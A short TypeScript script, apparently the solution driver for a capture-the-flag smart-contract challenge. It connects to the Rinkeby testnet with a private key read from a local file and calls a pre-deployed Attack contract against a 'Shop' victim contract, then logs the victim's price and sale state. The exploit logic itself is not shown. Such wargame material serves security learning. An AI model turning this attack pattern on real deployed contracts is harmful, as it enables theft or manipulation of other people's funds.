import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory, Shop__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x2Cfe9B45Ba2aa1db8af04c21d3dd9B722E73CBE2"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  const victim = Shop__factory.connect(addr, provider).connect(alice);
  const attack = Attack__factory.connect("0x448Ad804B18ae823Eab30893f77E921bd540452c", provider).connect(alice);

  // (new Attack__factory(alice)).deploy().then(async attack => {
  //   await attack.attack(addr, 4000)
  //   console.log(await victim.price())
  //   console.log(await victim.isSold())
  // })

  await attack.attack(addr, 4000)
  console.log(await victim.price())
  console.log(await victim.isSold())
}

main().catch(e => {
  console.log("Error: " + e)
})
